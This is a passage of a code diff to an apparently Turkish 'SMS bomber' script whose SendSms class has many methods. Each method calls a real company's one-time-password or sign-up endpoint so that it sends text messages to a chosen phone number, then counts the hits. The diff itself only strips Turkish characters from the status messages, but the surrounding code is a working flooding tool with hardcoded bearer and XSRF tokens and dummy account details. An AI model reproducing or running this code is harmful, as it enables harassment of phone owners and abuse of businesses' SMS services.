             headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Xsrf-Token": "dLW-gyiEuXVAX42kxdgccFjrCuCklM_ZqvwfzTtUEinJ5QA_54MJ4jI71JG_YzEgzNWtKtRuIB9OmCWiz4QKvTlO-FDTsPwS2tYpG4AxPno1", "Dnt": "1", "Referer": "https://online.kumport.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
             r = requests.get(url, headers=headers, verify=False)
             if r.text.replace("\"", "").split(",")[1].split(":")[1].lower() == "true":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> online.kumport.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> online.kumport.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> online.kumport.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> online.kumport.com.tr")
 
     
     #qumpara.com
@@ -463,12 +463,12 @@ class SendSms():
             json={"msisdn": f"+90{self.phone}"}
             r = requests.post(url, headers=headers, json=json)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> tr-api.fisicek.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> tr-api.fisicek.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> tr-api.fisicek.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> tr-api.fisicek.com")
 
 
     #paybol.com.tr
@@ -479,12 +479,12 @@ class SendSms():
             json={"phone_number": f"90{self.phone}"}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["status"] == 0:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> pyb-mobileapi.walletgate.io")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> pyb-mobileapi.walletgate.io")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> pyb-mobileapi.walletgate.io")
 
         
     #migros.com.tr
@@ -495,12 +495,12 @@ class SendSms():
             json={"phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["successful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> rest.migros.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> rest.migros.com.tr")
 
 
     #file.com.tr
@@ -511,12 +511,12 @@ class SendSms():
             json={"mobilePhoneNumber": f"90{self.phone}"}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["responseType"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> api.filemarket.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> api.filemarket.com.tr")
 
 
     #roombadi.com
@@ -527,12 +527,12 @@ class SendSms():
             json={"countryId": 2, "phone": self.phone}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["remainingTime"] == 120:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.roombadi.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> api.roombadi.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.roombadi.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> api.roombadi.com")
 
     
     #goyakit.com.tr
@@ -543,12 +543,12 @@ class SendSms():
             json={"isRegistered": False, "phone": self.phone}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["data"]["success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> gomobilapp.ipragaz.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> gomobilapp.ipragaz.com.tr")
 
 
     #joker.com.tr
@@ -558,13 +558,13 @@ class SendSms():
             headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4F5qftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds", "Accept-Encoding": "gzip, deflate", "User-Agent": "Joker/4.0.14 (com.joker.app; build:2; iOS 15.7.7) Alamofire/5.4.3", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Connection": "close"}
             json={"firstName": "Memati", "gender": "m", "iosVersion": "4.0.2", "lastName": "Bas", "os": "IOS", "password": "31ABC..abc31", "phoneNumber": f"0{self.phone}", "username": self.mail}
             r = requests.post(url, headers=headers, json=json)
-            if r.json()["message"] == "Doğrulama kodu gönderildi.":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.joker.com.tr")
+            if r.json()["message"] == "Dogrulama kodu gonderildi.":
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> api.joker.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.joker.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> api.joker.com.tr")
             
         
     #ak-asya.com.tr
@@ -575,12 +575,12 @@ class SendSms():
             headers = {"x-platform-token": "313131"}
             r = requests.post(url=url, headers=headers, json=json)
             if r.json()["result"] == "SMS sended succesfully!":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasya-admin.poilabs.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> akasya-admin.poilabs.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasya-admin.poilabs.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> akasya-admin.poilabs.com")
         
         
     #akbati.com
@@ -591,12 +591,12 @@ class SendSms():
             headers = {"x-platform-token": "313131"}
             r = requests.post(url=url, headers=headers, json=json)
             if r.json()["result"] == "SMS sended succesfully!":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbati-admin.poilabs.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> akbati-admin.poilabs.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbati-admin.poilabs.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> akbati-admin.poilabs.com")
     
     
     #clickmelive.com
@@ -607,12 +607,12 @@ class SendSms():
             json={"phone": self.phone}
             r = requests.post(url=url, json=json, headers=headers)
             if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> dev-azure-mobile-api.clickmelive.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> dev-azure-mobile-api.clickmelive.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> dev-azure-mobile-api.clickmelive.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> dev-azure-mobile-api.clickmelive.com")
     
     
     #happy.com.tr
@@ -623,12 +623,12 @@ class SendSms():
             data = {"telephone": self.phone}
             r = requests.post(url=url, data=data, headers=headers)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> happy.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> happy.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> happy.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> happy.com.tr")
     
 
     #komagene.com.tr
@@ -639,12 +639,12 @@ class SendSms():
             headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
             r = requests.post(url=url, headers=headers, json=json)
             if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> gateway.komagene.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> gateway.komagene.com.tr")
     
     
     #kuryemgelsin.com
@@ -654,12 +654,12 @@ class SendSms():
             json={"phoneNumber": self.phone, "phone_country_code": "+90"}
             r = requests.post(url=url, json=json)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kuryemgelsin.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> api.kuryemgelsin.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kuryemgelsin.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> api.kuryemgelsin.com")
     
     
     #porty.tech
@@ -670,12 +670,12 @@ class SendSms():
             json={"job": "start_login", "phone": self.phone}
             r = requests.post(url=url, json=json, headers=headers)
             if r.json()["status"]== "success":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> panel.porty.tech")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> panel.porty.tech")
             
     
     #taksim.digital
@@ -685,12 +685,12 @@ class SendSms():
             json= {"countryPhoneCode": "+90","phoneNo": self.phone}
             r = requests.post(url=url, json=json)
             if r.json()["success"]== True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> service.taksim.digital")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> service.taksim.digital")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> service.taksim.digital")
     
     
     #vakiftasdelensu.com
@@ -700,12 +700,12 @@ class SendSms():
             json= {"PhoneNumber": self.phone, "user": {"Password": "Aa123!35@1","UserName": "MobilOperator"}}
             r = requests.post(url=url, json=json)
             if r.json()["Result"]== True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> 94.102.66.162:80")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> 94.102.66.162:80")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> 94.102.66.162:80")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> 94.102.66.162:80")
     
     
     #tasimacim.com
@@ -715,12 +715,12 @@ class SendSms():
             json= {"phone": self.phone, "lang": "tr"}
             r = requests.post(url=url, json=json)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> server.tasimacim.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> server.tasimacim.com")
     
     
     #toptanteslim.com
@@ -731,12 +731,12 @@ class SendSms():
             data = {"telephone": f"0{self.phone}","name": "Memati","surname": "Bas","email": self.mail,"password": "313131","password_confirmation": "313131"}
             r = requests.post(url=url, data=data, headers=headers)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> tt.etic.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> tt.etic.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> tt.etic.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> tt.etic.com.tr")
     
 
     #unilever.com.tr
@@ -747,12 +747,12 @@ class SendSms():
             headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}
             r = requests.post(url=url, headers=headers, data=data)
             if r.json()["status"] == 1:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> siparisdirekt.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> siparisdirekt.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> siparisdirekt.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> siparisdirekt.com")
 
 
     #uysalmarket.com.tr
@@ -762,12 +762,12 @@ class SendSms():
             json = {"phone_number": self.phone}
             r = requests.post(url=url, json=json)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> api.uysalmarket.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> api.uysalmarket.com.tr")
     
     
     #yapp.com.tr
@@ -777,12 +777,12 @@ class SendSms():
             json={"app_version": "1.1.2", "code": "tr", "device_model": "iPhone9,4", "device_name": "", "device_type": "I", "device_version": "15.7.8", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "1", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
             r = requests.post(url=url, json=json)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> yapp.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> yapp.com.tr")
     
     
     #yilmazticaret.net
@@ -793,12 +793,12 @@ class SendSms():
             data = {"telefon": (None, f"0 {self.phone}"),"token": (None, "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")}
             r = requests.post(url, headers=headers,  data=data)
             if r.json()["giris"] == "success":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> yilmazticaret.net")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> yilmazticaret.net")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> yilmazticaret.net")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> yilmazticaret.net")
     
     
     #yuffi.co
@@ -808,12 +808,12 @@ class SendSms():
             json = {"phone": self.phone, "kvkk": True}
             r = requests.post(url, json=json)
             if r.json()["success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> api.yuffi.co")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> api.yuffi.co")
             
 
     #beefull.com
@@ -826,9 +826,9 @@ class SendSms():
             json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
             r = requests.post(url, json=json)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> app.beefull.io")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> app.beefull.io")
